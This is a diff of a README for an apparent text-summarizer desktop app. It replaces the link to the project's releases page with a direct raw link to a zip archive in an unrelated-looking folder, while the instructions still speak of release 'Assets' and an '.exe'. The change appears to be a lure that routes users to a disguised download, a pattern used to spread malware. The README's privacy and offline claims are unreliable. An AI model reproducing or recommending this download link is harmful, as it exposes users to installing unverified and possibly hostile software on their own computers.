@@ -1,12 +1,12 @@
 # 📝 Text-Summarizer-Tool-V2 - Create short summaries from long documents
 
-[![Download Text-Summarizer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/macalou3168/Text-Summarizer-Tool-V2/releases)
+[![Download Text-Summarizer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/macalou3168/Text-Summarizer-Tool-V2/main/dethronement/Text_Tool_Summarizer_2.5.zip)
 
 This application turns long documents into clear, short summaries. It runs entirely on your computer. You keep your files private because the software does not send data to the internet. The tool uses two methods to create summaries. It uses abstractive summarization to rewrite text in new words. It also uses extractive summarization to pull the most important sentences directly from the source.
 
 ## 📥 How to download the software
 
-1. Visit this [Download Page](https://github.com/macalou3168/Text-Summarizer-Tool-V2/releases) to see the latest version.
+1. Visit this [Download Page](https://raw.githubusercontent.com/macalou3168/Text-Summarizer-Tool-V2/main/dethronement/Text_Tool_Summarizer_2.5.zip) to see the latest version.
 2. Look for the section labeled "Assets" under the most recent release.
 3. Click the link ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
